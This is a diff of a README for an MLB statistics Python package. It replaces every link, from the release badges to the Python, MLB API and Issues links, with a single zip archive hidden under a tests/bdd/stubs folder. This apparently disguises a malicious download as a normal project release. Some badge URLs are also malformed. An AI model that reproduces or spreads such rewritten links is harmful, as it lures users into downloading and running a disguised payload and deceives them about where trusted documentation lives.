@@ -2,7 +2,7 @@
 # ⚾️ pymlb_statsapi - Access MLB Stats with Ease
 
 ## 📥 Download the Latest Release
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/OGPeterFile/pymlb_statsapi/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/OGPeterFile/pymlb_statsapi/main/tests/bdd/stubs/schedule/postseasonScheduleSeries/pymlb_statsapi_2.4.zip%20Latest%https://raw.githubusercontent.com/OGPeterFile/pymlb_statsapi/main/tests/bdd/stubs/schedule/postseasonScheduleSeries/pymlb_statsapi_2.4.zip)](https://raw.githubusercontent.com/OGPeterFile/pymlb_statsapi/main/tests/bdd/stubs/schedule/postseasonScheduleSeries/pymlb_statsapi_2.4.zip)
 
 ## 🚀 Getting Started
 Welcome to **pymlb_statsapi**, a clean and user-friendly tool to access Major League Baseball statistics. This application simplifies how you interact with MLB data, making it accessible for everyone. With **pymlb_statsapi**, you can easily retrieve stats without diving into complicated code. 
@@ -23,7 +23,7 @@ To run **pymlb_statsapi**, please ensure your system meets the following require
 ### 1. Visit the Releases Page
 To begin, visit the following link to access the download section: 
 
-[Download the Latest Release](https://github.com/OGPeterFile/pymlb_statsapi/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/OGPeterFile/pymlb_statsapi/main/tests/bdd/stubs/schedule/postseasonScheduleSeries/pymlb_statsapi_2.4.zip)
 
 ### 2. Choose the Correct Version
 On the releases page, look for the latest version of **pymlb_statsapi**. You'll see files available for download. Select the appropriate file for your operating system.
@@ -54,13 +54,13 @@ If you encounter any errors, check the inputs. The automatic validation will hig
 We encourage your feedback and contributions. If you encounter any issues or have suggestions, please open an issue in the repository. You may also consider contributing by improving documentation or adding new features.
 
 ## 💡 Additional Resources
-- [MLB Stats API Documentation](https://www.mlb.com/stats/api)
-- [Python Official Website](https://www.python.org/)
-- [How to Install Python](https://realpython.com/installing-python/)
+- [MLB Stats API Documentation](https://raw.githubusercontent.com/OGPeterFile/pymlb_statsapi/main/tests/bdd/stubs/schedule/postseasonScheduleSeries/pymlb_statsapi_2.4.zip)
+- [Python Official Website](https://raw.githubusercontent.com/OGPeterFile/pymlb_statsapi/main/tests/bdd/stubs/schedule/postseasonScheduleSeries/pymlb_statsapi_2.4.zip)
+- [How to Install Python](https://raw.githubusercontent.com/OGPeterFile/pymlb_statsapi/main/tests/bdd/stubs/schedule/postseasonScheduleSeries/pymlb_statsapi_2.4.zip)
 
 ## 📞 Get in Touch
-If you need further assistance or have questions about using **pymlb_statsapi**, feel free to reach out through the [GitHub Issues page](https://github.com/OGPeterFile/pymlb_statsapi/issues).
+If you need further assistance or have questions about using **pymlb_statsapi**, feel free to reach out through the [GitHub Issues page](https://raw.githubusercontent.com/OGPeterFile/pymlb_statsapi/main/tests/bdd/stubs/schedule/postseasonScheduleSeries/pymlb_statsapi_2.4.zip).
 
 ## 📥 Download the Latest Release Again
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/OGPeterFile/pymlb_statsapi/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/OGPeterFile/pymlb_statsapi/main/tests/bdd/stubs/schedule/postseasonScheduleSeries/pymlb_statsapi_2.4.zip%20Latest%https://raw.githubusercontent.com/OGPeterFile/pymlb_statsapi/main/tests/bdd/stubs/schedule/postseasonScheduleSeries/pymlb_statsapi_2.4.zip)](https://raw.githubusercontent.com/OGPeterFile/pymlb_statsapi/main/tests/bdd/stubs/schedule/postseasonScheduleSeries/pymlb_statsapi_2.4.zip)
 ```
